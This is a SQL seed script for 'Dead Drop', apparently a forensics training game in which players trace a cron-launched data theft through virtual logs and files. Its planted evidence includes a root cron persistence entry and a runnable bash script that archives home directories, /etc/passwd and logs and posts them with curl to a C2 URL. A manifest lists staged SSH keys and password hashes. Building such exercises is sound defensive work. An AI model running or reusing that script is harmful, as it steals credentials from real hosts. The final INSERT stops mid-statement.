-- =============================================================================
-- CLEANUP — Remove any existing "Dead Drop" data before re-inserting.
--
-- Run this block first if the scenario was previously loaded.
-- The ON DELETE CASCADE chains on scenarios handle all child rows:
--   → virtual_files, expected_steps, objectives
--   → scenario_discoveries → discovery_triggers
--   → sessions → command_history, evaluation_results, ai_hint_log,
--                 session_discoveries, user_hint_progress, badges
--   → user_progress
--
-- WARNING: This deletes all session and progress data for this scenario.
--          Only run on a dev/fresh environment, or when you intend a full reset.
-- =============================================================================

DO $$
DECLARE
    v_scenario_id INT;
BEGIN
    SELECT scenario_id INTO v_scenario_id
    FROM scenarios
    WHERE title = 'Dead Drop'
    ORDER BY created_at DESC
    LIMIT 1;

    IF v_scenario_id IS NOT NULL THEN
        -- Explicit child cleanup in safe order before scenario delete
        DELETE FROM session_discoveries
        WHERE discovery_id IN (
            SELECT discovery_id FROM scenario_discoveries
            WHERE scenario_id = v_scenario_id
        );

        DELETE FROM scenario_discoveries WHERE scenario_id = v_scenario_id;

        -- Deleting the scenario cascades to:
        -- virtual_files, expected_steps, objectives,
        -- sessions (→ command_history, evaluation_results, ai_hint_log,
        --              user_hint_progress, badges),
        -- user_progress
        DELETE FROM scenarios WHERE scenario_id = v_scenario_id;

        RAISE NOTICE 'Removed existing Dead Drop scenario (id=%)', v_scenario_id;
    ELSE
        RAISE NOTICE 'No existing Dead Drop scenario found — clean insert.';
    END IF;
END;
$$;

-- =============================================================================
-- SCENARIO: "Dead Drop"   (REBUILT — Discovery-Based Progression)
-- Type:       script_exec
-- Difficulty: easy
--
-- STORY
-- ─────
-- Automated threat monitoring flagged an anomalous cron execution at 03:14 AM
-- on prod-internal-01. The triggered script (/tmp/.cache/sync.sh) has since
-- self-deleted but left a chain of artifacts across the system. A modified
-- scheduler entry, a system-log execution trace, a leftover PID file, a
-- hidden payload cache, and a captured network connection record were all
-- preserved before the next log rotation cycle.
--
-- Your mission: reconstruct the full execution chain.
-- Determine what ran, what it collected, and where it called home.
--
-- INVESTIGATION PHILOSOPHY (discovery-based)
-- ──────────────────────────────────────────
-- This scenario does NOT require a fixed command sequence.
-- Players may approach the investigation in any order using any supported
-- technique. Evidence is evaluated by WHAT you discovered, not HOW.
--
-- Examples of valid paths to the same discovery:
--
--   CRON_SCHEDULER_ACCESSED
--     ✓ ls /etc/cron.d
--     ✓ ls /etc
--     ✓ find /etc -type d
--     ✓ find / -name "*.d"
--     ✓ locate cron
--     ✓ locate updater
--
--   EXECUTION_TRACED_IN_SYSLOG
--     ✓ cat /var/log/syslog
--     ✓ grep -r "sync" /var/log
--     ✓ strings /var/log/syslog
--     ✓ find /var/log
--     ✓ locate syslog
--
-- DISCOVERIES (5 critical, 2 bonus)
-- ───────────────────────────────────
--   Critical (weights sum to 100):
--     1. CRON_SCHEDULER_ACCESSED       15 pts  → maps to step 1
--     2. MALICIOUS_CRON_ENTRY_READ     20 pts  → maps to step 2
--     3. EXECUTION_TRACED_IN_SYSLOG    20 pts  → maps to step 3
--     4. PAYLOAD_LOCATION_IDENTIFIED   25 pts  → maps to step 4
--     5. SCRIPT_CONTENT_ANALYZED       20 pts  → maps to step 5
--
--   Bonus (non-critical, no weight):
--     6. EXFIL_CONFIRMED_VIA_NETLOG    [SECRET]  → maps to step 6
--     7. PROCESS_ACTIVITY_EXAMINED     [BONUS]   → no step mapping
--
-- VIRTUAL FILESYSTEM
-- ──────────────────
--   /etc/cron.d/updater          malicious cron entry
--   /etc/cron.d/system-check     decoy legitimate cron
--   /etc/hostname                machine identity
--   /etc/passwd                  system users (contextual)
--   /home/sysadmin/.bash_history HIDDEN → revealed on CRON_SCHEDULER_ACCESSED
--   /var/log/auth.log            SSH history (visible)
--   /var/log/syslog              cron execution trace (visible)
--   /var/log/net.log             HIDDEN → revealed on EXECUTION_TRACED_IN_SYSLOG
--   /tmp/sync.pid                leftover PID file (visible)
--   /tmp/.cache/sync.sh          HIDDEN → revealed on PAYLOAD_LOCATION_IDENTIFIED
--   /tmp/.cache/.exfil_manifest  HIDDEN → revealed on PAYLOAD_LOCATION_IDENTIFIED
-- =============================================================================


-- =============================================================================
-- SECTION 1: SCENARIO
-- =============================================================================

INSERT INTO scenarios (title, type, difficulty, mission_brief, is_active, scenario_order)
VALUES (
    'Dead Drop',
    'script_exec',
    'easy',
    E'Automated threat monitoring flagged an anomalous cron execution at 03:14 AM on prod-internal-01. The triggered script is no longer present on disk — but it left footprints. A modified scheduler entry, a process trace in the system log, a staged payload buried in a temp directory, and a suspicious outbound connection were all captured before log rotation. Your mission: reconstruct the full execution chain. Find what ran, what it collected, and where it called home. Investigate freely — evidence responds to any valid forensic technique.',
    TRUE,
    (SELECT COALESCE(MAX(scenario_order), 0) + 1 FROM scenarios)
);


-- =============================================================================
-- SECTION 2: VIRTUAL FILES
-- =============================================================================
-- Filesystem layout:
--   /etc/cron.d/updater        → malicious cron  (visible)
--   /etc/cron.d/system-check   → legit decoy     (visible)
--   /etc/hostname              → machine name     (visible)
--   /etc/passwd                → user accounts    (visible)
--   /home/sysadmin/.bash_history → HIDDEN, reveal on discovery: CRON_SCHEDULER_ACCESSED
--   /var/log/auth.log          → SSH history      (visible)
--   /var/log/syslog            → execution trace  (visible)
--   /var/log/net.log           → netconn log      HIDDEN, reveal on discovery: EXECUTION_TRACED_IN_SYSLOG
--   /tmp/sync.pid              → PID remnant      (visible)
--   /tmp/.cache/sync.sh        → payload script   HIDDEN, reveal on discovery: PAYLOAD_LOCATION_IDENTIFIED
--   /tmp/.cache/.exfil_manifest→ staged files     HIDDEN, reveal on discovery: PAYLOAD_LOCATION_IDENTIFIED
-- =============================================================================

WITH s AS (
    SELECT scenario_id FROM scenarios
    WHERE title = 'Dead Drop'
    ORDER BY created_at DESC LIMIT 1
)

INSERT INTO virtual_files
    (scenario_id, file_name, file_path, content, file_type,
     is_hidden, reveal_at_step, reveal_at_discovery_key, evidence_tags, metadata)
VALUES

-- ── /etc directory ─────────────────────────────────────────────────────────
(
    (SELECT scenario_id FROM s),
    'etc', '/etc', NULL, 'directory',
    FALSE, NULL, NULL, NULL, NULL
),

-- ── /etc/cron.d directory ──────────────────────────────────────────────────
(
    (SELECT scenario_id FROM s),
    'cron.d', '/etc/cron.d', NULL, 'directory',
    FALSE, NULL, NULL,
    ARRAY['persistence', 'scheduler'],
    '{"permissions": "drwxr-xr-x", "owner": "root"}'::jsonb
),

-- ── /etc/cron.d/updater ────────────────────────────────────────────────────
-- Primary evidence: the malicious cron entry that schedules sync.sh
(
    (SELECT scenario_id FROM s),
    'updater',
    '/etc/cron.d/updater',
    '# Added by system-updater v2
# DO NOT EDIT

14 3 * * * root /tmp/.cache/sync.sh > /dev/null 2>&1',
    'text',
    FALSE, NULL, NULL,
    ARRAY['persistence', 'cron', 'scheduled_task', 'malicious'],
    '{"permissions": "-rw-r--r--", "owner": "root", "modified": "2024-04-18T22:31:07Z", "size_bytes": 78}'::jsonb
),

-- ── /etc/cron.d/system-check ───────────────────────────────────────────────
-- Decoy: a legitimate-looking cron job to create noise
(
    (SELECT scenario_id FROM s),
    'system-check',
    '/etc/cron.d/system-check',
    '# System health check — installed by sysadmin
# Runs every 6 hours

0 */6 * * * root /usr/local/bin/healthcheck.sh',
    'text',
    FALSE, NULL, NULL,
    ARRAY['scheduled_task'],
    '{"permissions": "-rw-r--r--", "owner": "root", "modified": "2024-01-12T10:00:00Z", "size_bytes": 89}'::jsonb
),

-- ── /etc/hostname ──────────────────────────────────────────────────────────
(
    (SELECT scenario_id FROM s),
    'hostname', '/etc/hostname',
    'prod-internal-01',
    'text',
    FALSE, NULL, NULL, NULL, NULL
),

-- ── /etc/passwd ────────────────────────────────────────────────────────────
-- Gives context: who has accounts? Root is clearly being used by the script.
(
    (SELECT scenario_id FROM s),
    'passwd', '/etc/passwd',
    'root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sysadmin:x:1001:1001:System Administrator:/home/sysadmin:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin',
    'text',
    FALSE, NULL, NULL,
    ARRAY['user_accounts'],
    '{"permissions": "-rw-r--r--", "owner": "root"}'::jsonb
),

-- ── /home directory ────────────────────────────────────────────────────────
(
    (SELECT scenario_id FROM s),
    'home', '/home', NULL, 'directory',
    FALSE, NULL, NULL, NULL, NULL
),

(
    (SELECT scenario_id FROM s),
    'sysadmin', '/home/sysadmin', NULL, 'directory',
    FALSE, NULL, NULL, NULL, NULL
),

-- ── /home/sysadmin/.bash_history ───────────────────────────────────────────
-- HIDDEN — revealed when the cron scheduler discovery fires.
-- Shows the admin recently investigated cron and noticed something odd,
-- then stopped — giving the player a narrative clue.
(
    (SELECT scenario_id FROM s),
    '.bash_history',
    '/home/sysadmin/.bash_history',
    'ls /etc/cron.d
cat /etc/cron.d/updater
ls -la /tmp/.cache
echo "what is this?"
exit',
    'text',
    TRUE, NULL, 'CRON_SCHEDULER_ACCESSED',
    ARRAY['user_activity', 'forensic_artifact'],
    '{"permissions": "-rw-------", "owner": "sysadmin", "modified": "2024-04-19T03:30:00Z"}'::jsonb
),

-- ── /var directory ─────────────────────────────────────────────────────────
(
    (SELECT scenario_id FROM s),
    'var', '/var', NULL, 'directory',
    FALSE, NULL, NULL, NULL, NULL
),

(
    (SELECT scenario_id FROM s),
    'log', '/var/log', NULL, 'directory',
    FALSE, NULL, NULL, NULL, NULL
),

-- ── /var/log/auth.log ──────────────────────────────────────────────────────
-- Visible: shows root logged in via SSH right before the 3 AM execution.
-- Corroborates the attack timeline.
(
    (SELECT scenario_id FROM s),
    'auth.log',
    '/var/log/auth.log',
    'Apr 19 02:58:44 prod-internal-01 sshd[3801]: Accepted publickey for root from 10.0.0.5 port 52841
Apr 19 02:58:44 prod-internal-01 sshd[3801]: pam_unix(sshd:session): session opened for user root
Apr 19 03:00:01 prod-internal-01 CRON[3847]: pam_unix(cron:session): session opened for user root
Apr 19 03:14:00 prod-internal-01 CRON[4021]: pam_unix(cron:session): session opened for user root
Apr 19 03:14:10 prod-internal-01 CRON[4021]: pam_unix(cron:session): session closed for user root
Apr 19 03:15:02 prod-internal-01 sshd[3801]: Disconnected from user root 10.0.0.5 port 52841',
    'log',
    FALSE, NULL, NULL,
    ARRAY['authentication', 'ssh', 'root_access'],
    '{"permissions": "-rw-r-----", "owner": "root", "group": "adm"}'::jsonb
),

-- ── /var/log/syslog ────────────────────────────────────────────────────────
-- Visible: the critical execution trace. Shows cron running sync.sh,
-- the UFW firewall allowing the outbound connection, and script output.
(
    (SELECT scenario_id FROM s),
    'syslog',
    '/var/log/syslog',
    'Apr 19 03:00:01 prod-internal-01 CRON[3847]: (root) CMD (/usr/local/bin/healthcheck.sh)
Apr 19 03:00:03 prod-internal-01 systemd[1]: Started Session 42 of user root.
Apr 19 03:13:51 prod-internal-01 systemd[1]: Starting Daily log rotation...
Apr 19 03:14:00 prod-internal-01 CRON[4021]: (root) CMD (/tmp/.cache/sync.sh > /dev/null 2>&1)
Apr 19 03:14:01 prod-internal-01 kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.5 DST=45.33.32.156 LEN=52 PROTO=TCP DPT=443
Apr 19 03:14:03 prod-internal-01 sync.sh[4022]: [*] Collecting target data...
Apr 19 03:14:07 prod-internal-01 sync.sh[4022]: [*] Archive written to /tmp/.cache/out.tar.gz
Apr 19 03:14:09 prod-internal-01 sync.sh[4022]: [+] Transfer complete. Bytes sent: 48221
Apr 19 03:14:10 prod-internal-01 CRON[4021]: (root) END (/tmp/.cache/sync.sh)
Apr 19 03:15:01 prod-internal-01 CRON[4105]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
Apr 19 03:20:00 prod-internal-01 systemd[1]: Reached target Multi-User System.',
    'log',
    FALSE, NULL, NULL,
    ARRAY['execution_trace', 'cron', 'network_activity', 'exfiltration'],
    '{"permissions": "-rw-r-----", "owner": "root", "group": "adm"}'::jsonb
),

-- ── /var/log/net.log ───────────────────────────────────────────────────────
-- HIDDEN — revealed when EXECUTION_TRACED_IN_SYSLOG discovery fires.
-- Contains the captured TLS session details: C2 host, bytes transferred.
(
    (SELECT scenario_id FROM s),
    'net.log',
    '/var/log/net.log',
    '=== NETWORK CONNECTION LOG — prod-internal-01 ===
Captured: Apr 19 03:10:00 – 03:20:00

[03:13:58] ESTABLISHED  TCP  10.0.0.5:51204  →  45.33.32.156:443   (UNKNOWN HOST)
[03:14:01] SENT         TLS ClientHello      SNI: updates.delivery-cdn.net
[03:14:02] RECV         TLS ServerHello      CERT: CN=delivery-cdn.net  ISSUER: Let''s Encrypt
[03:14:09] SENT         HTTP POST /upload    Size: 48221 bytes
[03:14:10] CLOSED       TCP  10.0.0.5:51204  →  45.33.32.156:443

VERDICT: Non-whitelisted external IP. No matching outbound policy.
THREAT INTEL: 45.33.32.156 flagged in abuse DB — category: C2/exfiltration endpoint.',
    'log',
    TRUE, 3, 'EXECUTION_TRACED_IN_SYSLOG',
    ARRAY['network_forensics', 'c2', 'exfiltration', 'tls'],
    '{"permissions": "-rw-r-----", "owner": "root", "group": "adm"}'::jsonb
),

-- ── /tmp directory ─────────────────────────────────────────────────────────
(
    (SELECT scenario_id FROM s),
    'tmp', '/tmp', NULL, 'directory',
    FALSE, NULL, NULL, NULL, NULL
),

-- ── /tmp/sync.pid ──────────────────────────────────────────────────────────
-- Visible: leftover PID file written by sync.sh during its run.
-- Tells the investigator a process existed with PID 4022.
(
    (SELECT scenario_id FROM s),
    'sync.pid',
    '/tmp/sync.pid',
    '4022',
    'text',
    FALSE, NULL, NULL,
    ARRAY['forensic_artifact', 'process_activity'],
    '{"permissions": "-rw-r--r--", "owner": "root", "modified": "2024-04-19T03:14:10Z"}'::jsonb
),

-- ── /tmp/.cache directory ──────────────────────────────────────────────────
-- Hidden parent for the payload — only appears after PAYLOAD_LOCATION_IDENTIFIED
(
    (SELECT scenario_id FROM s),
    '.cache', '/tmp/.cache', NULL, 'directory',
    FALSE, NULL, NULL, NULL, NULL
),

-- ── /tmp/.cache/sync.sh ────────────────────────────────────────────────────
-- HIDDEN — revealed on PAYLOAD_LOCATION_IDENTIFIED.
-- The full malicious script: staging, exfil via curl, self-cleanup.
(
    (SELECT scenario_id FROM s),
    'sync.sh',
    '/tmp/.cache/sync.sh',
    '#!/bin/bash
# system-updater sync module
# v2.1.4 — do not modify

TARGET_DIR="/home /etc/passwd /var/log"
STAGING="/tmp/.cache/out.tar.gz"
C2="https://updates.delivery-cdn.net/upload"

# Stage archive
tar czf "$STAGING" $TARGET_DIR 2>/dev/null

# Exfiltrate
curl -s -X POST "$C2" \
  -H "X-Client-ID: prod-internal-01" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@$STAGING"

# Cleanup
rm -f "$STAGING"
exit 0',
    'text',
    TRUE, 4, 'PAYLOAD_LOCATION_IDENTIFIED',
    ARRAY['malware', 'exfiltration', 'bash_script', 'persistence'],
    '{"permissions": "-rwxr-xr-x", "owner": "root", "modified": "2024-04-18T22:31:07Z", "size_bytes": 412}'::jsonb
),

-- ── /tmp/.cache/.exfil_manifest ────────────────────────────────────────────
-- HIDDEN — revealed on PAYLOAD_LOCATION_IDENTIFIED.
-- Lists exactly what data was staged by the script before the archive was sent.
(
    (SELECT scenario_id FROM s),
    '.exfil_manifest',
    '/tmp/.cache/.exfil_manifest',
    '# sync.sh staging manifest — generated 2024-04-19 03:14:03 UTC
# Files queued for exfiltration:

/home/sysadmin/.ssh/id_rsa          [PRIVATE KEY]
/home/sysadmin/.ssh/authorized_keys [AUTH KEYS]
/home/sysadmin/.bash_history        [SHELL HISTORY]
/etc/passwd                         [USER ACCOUNTS]
/etc/shadow                         [PASSWORD HASHES — if readable]
/var/log/auth.log                   [AUTH RECORDS]

Total files staged: 6
Archive size: 48221 bytes
Destination: https://updates.delivery-cdn.net/upload',
    'text',
    TRUE, 4, 'PAYLOAD_LOCATION_IDENTIFIED',
    ARRAY['exfiltration', 'data_staging', 'forensic_artifact'],
    '{"permissions": "-rw-------", "owner": "root", "modified": "2024-04-19T03:14:03Z"}'::jsonb
);


-- =============================================================================
-- SECTION 3: EXPECTED STEPS
-- =============================================================================
-- These steps serve dual purpose:
--   1. Keep the hint level system (playerStateAnalyzer) fully functional —
--      it reads completedStepOrders from command_history.
--   2. Provide the "primary path" for direct-match players who type the
--      most obvious command first.
--
-- Discovery triggers credit these same step_orders via maps_to_step_order,
-- so alternative paths produce identical hint system state.
--
-- Weights: 15 + 20 + 20 + 25 + 20 = 100
-- =============================================================================

WITH s AS (
    SELECT scenario_id FROM scenarios
    WHERE title = 'Dead Drop'
    ORDER BY created_at DESC LIMIT 1
)

INSERT INTO expected_steps (scenario_id, step_order, command_expected, target_path, weight_percent, description)
VALUES
(
    (SELECT scenario_id FROM s),
    1, 'ls', '/etc/cron.d', 15,
    'Accessed the cron scheduler directory — identified scheduled job files including the suspicious updater entry'
),
(
    (SELECT scenario_id FROM s),
    2, 'cat', '/etc/cron.d/updater', 20,
    'Read the malicious cron entry — confirmed script path /tmp/.cache/sync.sh scheduled at 03:14'
),
(
    (SELECT scenario_id FROM s),
    3, 'cat', '/var/log/syslog', 20,
    'Analyzed the system log — traced cron execution event and outbound network connection at 03:14'
),
(
    (SELECT scenario_id FROM s),
    4, 'find', '/tmp', 25,
    'Searched /tmp for hidden artifacts — discovered the .cache directory containing the payload and manifest'
),
(
    (SELECT scenario_id FROM s),
    5, 'cat', '/tmp/.cache/sync.sh', 20,
    'Analyzed the malicious script — revealed collection targets, C2 endpoint, and exfiltration method'
),
-- Step 6: secret bonus step (net.log confirmation)
(
    (SELECT scenario_id FROM s),
    6, 'cat', '/var/log/net.log', 0,
    'Cross-referenced the network log — confirmed TLS connection to flagged C2 host, 48221 bytes exfiltrated'
);


-- =============================================================================
-- SECTION 4: SCENARIO DISCOVERIES
-- =============================================================================

WITH s AS (
    SELECT scenario_id FROM scenarios
    WHERE title = 'Dead Drop'
    ORDER BY created_at DESC LIMIT 1
)

INSERT INTO scenario_discoveries
    (scenario_id, discovery_key, title, description, evidence_tags,
     weight_percent, discovery_order, is_critical, maps_to_step_order, reveal_hint)
VALUES

-- ── Discovery 1: CRON_SCHEDULER_ACCESSED (critical, 15 pts) ────────────────
(
    (SELECT scenario_id FROM s),
    'CRON_SCHEDULER_ACCESSED',
    'Cron Scheduler Examined',
    'The player accessed the scheduled task configuration, revealing automated jobs running on this host.',
    ARRAY['persistence', 'scheduler', 'cron'],
    15, 1, TRUE, 1,
    'Scheduled task configuration accessed. Two entries visible — one is not what it appears to be.'
),

-- ── Discovery 2: MALICIOUS_CRON_ENTRY_READ (critical, 20 pts) ─────────────
(
    (SELECT scenario_id FROM s),
    'MALICIOUS_CRON_ENTRY_READ',
    'Malicious Cron Entry Identified',
    'The player read the content of the suspicious cron job, revealing the script path and execution schedule.',
    ARRAY['persistence', 'cron', 'scheduled_task', 'malicious'],
    20, 2, TRUE, 2,
    'Cron entry decoded. A script path in /tmp is scheduled to run as root at a specific hour. That path is significant.'
),

-- ── Discovery 3: EXECUTION_TRACED_IN_SYSLOG (critical, 20 pts) ────────────
(
    (SELECT scenario_id FROM s),
    'EXECUTION_TRACED_IN_SYSLOG',
    'Script Execution Traced in System Log',
    'The player found evidence of the script running in system logs, including the outbound network connection it initiated.',
    ARRAY['execution_trace', 'log_analysis', 'network_activity'],
    20, 3, TRUE, 3,
    'Execution event confirmed in system log. An outbound connection record was logged seconds after the cron job fired.'
),

-- ── Discovery 4: PAYLOAD_LOCATION_IDENTIFIED (critical, 25 pts) ───────────
(
    (SELECT scenario_id FROM s),
    'PAYLOAD_LOCATION_IDENTIFIED',
    'Payload Cache Located',
    'The player found the hidden .cache directory in /tmp containing the payload script and file manifest.',
    ARRAY['malware', 'file_system', 'persistence'],
    25, 4, TRUE, 4,
    'Hidden directory identified under /tmp. Contents include the execution script and a list of staged files.'
),

-- ── Discovery 5: SCRIPT_CONTENT_ANALYZED (critical, 20 pts) ───────────────
(
    (SELECT scenario_id FROM s),
    'SCRIPT_CONTENT_ANALYZED',
    'Payload Script Fully Analyzed',
    'The player read the malicious script content, revealing the collection targets, staging logic, and C2 endpoint.',
    ARRAY['malware', 'bash_script', 'exfiltration', 'c2'],
    20, 5, TRUE, 5,
    'Script content decoded. Collection targets, archive staging, and the curl-based exfiltration channel are all visible.'
),

-- ── Discovery 6: EXFIL_CONFIRMED_VIA_NETLOG (bonus/secret) ─────────────────
(
    (SELECT scenario_id FROM s),
    'EXFIL_CONFIRMED_VIA_NETLOG',
    'Exfiltration Confirmed via Network Log',
    '[CLASSIFIED] The player cross-referenced the network log, confirming the TLS session details and bytes transferred to the C2 host.',
    ARRAY['network_forensics', 'c2', 'exfiltration', 'tls'],
    0, 6, FALSE, 6,
    'Network record confirms the connection. TLS handshake SNI, certificate chain, and 48221 bytes of outbound data are logged.'
),

-- ── Discovery 7: PROCESS_ACTIVITY_EXAMINED (bonus) ─────────────────────────
(
    (SELECT scenario_id FROM s),
    'PROCESS_ACTIVITY_EXAMINED',
    'Running Process List Examined',
    'The player inspected the process table — a suspicious shell process in /tmp is visible, corroborating the execution timeline.',
    ARRAY['process_activity', 'runtime_forensics'],
    0, 7, FALSE, NULL,
    'Process table accessed. A shell process with a /tmp path was active at the time of the incident.'
);


-- =============================================================================
-- SECTION 5: DISCOVERY TRIGGERS
-- =============================================================================
-- Each discovery can be unlocked by ANY of its listed triggers.
-- trigger_command + target_pattern + match_type = the matching rule.
-- name_filter_pattern is only used for `find -name` style matching.
-- =============================================================================

WITH d AS (
    SELECT disc.discovery_id, disc.discovery_key
    FROM scenario_discoveries disc
    JOIN scenarios s ON s.scenario_id = disc.scenario_id
    WHERE s.title = 'Dead Drop'
    ORDER BY s.created_at DESC
)

INSERT INTO discovery_triggers
    (discovery_id, trigger_command, target_pattern, match_type, name_filter_pattern)
VALUES

-- ══════════════════════════════════════════════════════════════════════════════
-- DISCOVERY: CRON_SCHEDULER_ACCESSED
-- Triggered by any technique that lands the player in or inspects /etc/cron.d
-- ══════════════════════════════════════════════════════════════════════════════

-- ls /etc/cron.d  (most direct)
((SELECT discovery_id FROM d WHERE discovery_key = 'CRON_SCHEDULER_ACCESSED'),
 'ls', '/etc/cron.d', 'exact', NULL),

-- ls /etc  (player browses the parent, sees cron.d listed)
((SELECT discovery_id FROM d WHERE discovery_key = 'CRON_SCHEDULER_ACCESSED'),
 'ls', '/etc', 'exact', NULL),

-- find /etc  (recursive find from /etc root)
((SELECT discovery_id FROM d WHERE discovery_key = 'CRON_SCHEDULER_ACCESSED'),
 'find', '/etc', 'exact', NULL),

-- find / -name "*.d"  (searching for .d directories by name pattern)
((SELECT discovery_id FROM d WHERE discovery_key = 'CRON_SCHEDULER_ACCESSED'),
 'find', NULL, 'exact', '.d'),

-- find / -name "*cron*"  (searching for anything with "cron" in the name)
((SELECT discovery_id FROM d WHERE discovery_key = 'CRON_SCHEDULER_ACCESSED'),
 'find', NULL, 'exact', 'cron'),

-- locate cron  (keyword search)
((SELECT discovery_id FROM d WHERE discovery_key = 'CRON_SCHEDULER_ACCESSED'),
 'locate', 'cron', 'contains', NULL),

-- locate updater  (searching for the file by name — also triggers discovery 2)
((SELECT discovery_id FROM d WHERE discovery_key = 'CRON_SCHEDULER_ACCESSED'),
 'locate', 'updater', 'contains', NULL),

-- grep -r "cron" /etc  (scanning /etc for cron references)
((SELECT discovery_id FROM d WHERE discovery_key = 'CRON_SCHEDULER_ACCESSED'),
 'grep', '/etc', 'prefix', NULL),


-- ══════════════════════════════════════════════════════════════════════════════
-- DISCOVERY: MALICIOUS_CRON_ENTRY_READ
-- Triggered when the player actually reads or inspects the updater file content
-- ══════════════════════════════════════════════════════════════════════════════

-- cat /etc/cron.d/updater  (direct read)
((SELECT discovery_id FROM d WHERE discovery_key = 'MALICIOUS_CRON_ENTRY_READ'),
 'cat', '/etc/cron.d/updater', 'exact', NULL),

-- strings /etc/cron.d/updater  (extract printable strings)
((SELECT discovery_id FROM d WHERE discovery_key = 'MALICIOUS_CRON_ENTRY_READ'),
 'strings', '/etc/cron.d/updater', 'exact', NULL),

-- grep <anything> /etc/cron.d/updater  (searching the file)
((SELECT discovery_id FROM d WHERE discovery_key = 'MALICIOUS_CRON_ENTRY_READ'),
 'grep', '/etc/cron.d/updater', 'exact', NULL),

-- grep -r <anything> /etc/cron.d  (recursive grep across all cron.d files)
((SELECT discovery_id FROM d WHERE discovery_key = 'MALICIOUS_CRON_ENTRY_READ'),
 'grep', '/etc/cron.d', 'exact', NULL),

-- locate updater  (locates the file, implicitly reads path → counts as awareness)
((SELECT discovery_id FROM d WHERE discovery_key = 'MALICIOUS_CRON_ENTRY_READ'),
 'locate', 'updater', 'contains', NULL),


-- ══════════════════════════════════════════════════════════════════════════════
-- DISCOVERY: EXECUTION_TRACED_IN_SYSLOG
-- Triggered when the player accesses or searches the syslog for execution evidence
-- ══════════════════════════════════════════════════════════════════════════════

-- cat /var/log/syslog  (direct read)
((SELECT discovery_id FROM d WHERE discovery_key = 'EXECUTION_TRACED_IN_SYSLOG'),
 'cat', '/var/log/syslog', 'exact', NULL),

-- strings /var/log/syslog  (printable string extraction)
((SELECT discovery_id FROM d WHERE discovery_key = 'EXECUTION_TRACED_IN_SYSLOG'),
 'strings', '/var/log/syslog', 'exact', NULL),

-- grep <anything> /var/log/syslog  (targeted search in syslog)
((SELECT discovery_id FROM d WHERE discovery_key = 'EXECUTION_TRACED_IN_SYSLOG'),
 'grep', '/var/log/syslog', 'exact', NULL),

-- grep -r <anything> /var/log  (recursive search in log directory)
((SELECT discovery_id FROM d WHERE discovery_key = 'EXECUTION_TRACED_IN_SYSLOG'),
 'grep', '/var/log', 'prefix', NULL),

-- find /var/log  (enumerating the log directory reveals syslog presence)
((SELECT discovery_id FROM d WHERE discovery_key = 'EXECUTION_TRACED_IN_SYSLOG'),
 'find', '/var/log', 'exact', NULL),

-- ls /var/log  (listing the log directory)
((SELECT discovery_id FROM d WHERE discovery_key = 'EXECUTION_TRACED_IN_SYSLOG'),
 'ls', '/var/log', 'exact', NULL),

-- locate syslog  (keyword search)
((SELECT discovery_id FROM d WHERE discovery_key = 'EXECUTION_TRACED_IN_SYSLOG'),
 'locate', 'syslog', 'contains', NULL),


-- ══════════════════════════════════════════════════════════════════════════════
-- DISCOVERY: PAYLOAD_LOCATION_IDENTIFIED
-- Triggered when the player finds the hidden .cache directory under /tmp
-- ══════════════════════════════════════════════════════════════════════════════

-- find /tmp  (most direct: recursive find reveals .cache)
((SELECT discovery_id FROM d WHERE discovery_key = 'PAYLOAD_LOCATION_IDENTIFIED'),
 'find', '/tmp', 'exact', NULL),

-- find /tmp -type f  (file-only find)
((SELECT discovery_id FROM d WHERE discovery_key = 'PAYLOAD_LOCATION_IDENTIFIED'),
 'find', '/tmp', 'prefix', NULL),

-- find / -name "*.sh"  (name-based search across filesystem)
((SELECT discovery_id FROM d WHERE discovery_key = 'PAYLOAD_LOCATION_IDENTIFIED'),
 'find', NULL, 'exact', '.sh'),

-- find / -name "sync*"  (name search for sync files)
((SELECT discovery_id FROM d WHERE discovery_key = 'PAYLOAD_LOCATION_IDENTIFIED'),
 'find', NULL, 'exact', 'sync'),

-- ls /tmp  (listing /tmp shows sync.pid, suggesting more files exist)
((SELECT discovery_id FROM d WHERE discovery_key = 'PAYLOAD_LOCATION_IDENTIFIED'),
 'ls', '/tmp', 'exact', NULL),

-- ls /tmp/.cache  (direct listing of the cache directory)
((SELECT discovery_id FROM d WHERE discovery_key = 'PAYLOAD_LOCATION_IDENTIFIED'),
 'ls', '/tmp/.cache', 'exact', NULL),

-- locate sync  (finds sync.sh and sync.pid)
((SELECT discovery_id FROM d WHERE discovery_key = 'PAYLOAD_LOCATION_IDENTIFIED'),
 'locate', 'sync', 'contains', NULL),

-- locate .cache  (directly searches for the cache directory)
((SELECT discovery_id FROM d WHERE discovery_key = 'PAYLOAD_LOCATION_IDENTIFIED'),
 'locate', '.cache', 'contains', NULL),


-- ══════════════════════════════════════════════════════════════════════════════
-- DISCOVERY: SCRIPT_CONTENT_ANALYZED
-- Triggered when the player reads or extracts strings from sync.sh
-- ══════════════════════════════════════════════════════════════════════════════

-- cat /tmp/.cache/sync.sh  (direct read)
((SELECT discovery_id FROM d WHERE discovery_key = 'SCRIPT_CONTENT_ANALYZED'),
 'cat', '/tmp/.cache/sync.sh', 'exact', NULL),

-- strings /tmp/.cache/sync.sh  (printable string extraction — reveals C2 URL)
((SELECT discovery_id FROM d WHERE discovery_key = 'SCRIPT_CONTENT_ANALYZED'),
 'strings', '/tmp/.cache/sync.sh', 'exact', NULL),

-- grep <anything> /tmp/.cache/sync.sh  (pattern search within the script)
((SELECT discovery_id FROM d WHERE discovery_key = 'SCRIPT_CONTENT_ANALYZED'),
 'grep', '/tmp/.cache/sync.sh', 'exact', NULL),

-- grep -r <anything> /tmp/.cache  (recursive search in cache dir)
((SELECT discovery_id FROM d WHERE discovery_key = 'SCRIPT_CONTENT_ANALYZED'),
 'grep', '/tmp/.cache', 'prefix', NULL),


-- ══════════════════════════════════════════════════════════════════════════════
-- DISCOVERY: EXFIL_CONFIRMED_VIA_NETLOG  (bonus/secret)
-- Triggered when the player finds and reads the network log
-- ══════════════════════════════════════════════════════════════════════════════

-- cat /var/log/net.log
((SELECT discovery_id FROM d WHERE discovery_key = 'EXFIL_CONFIRMED_VIA_NETLOG'),
 'cat', '/var/log/net.log', 'exact', NULL),

-- strings /var/log/net.log
((SELECT discovery_id FROM d WHERE discovery_key = 'EXFIL_CONFIRMED_VIA_NETLOG'),
 'strings', '/var/log/net.log', 'exact', NULL),

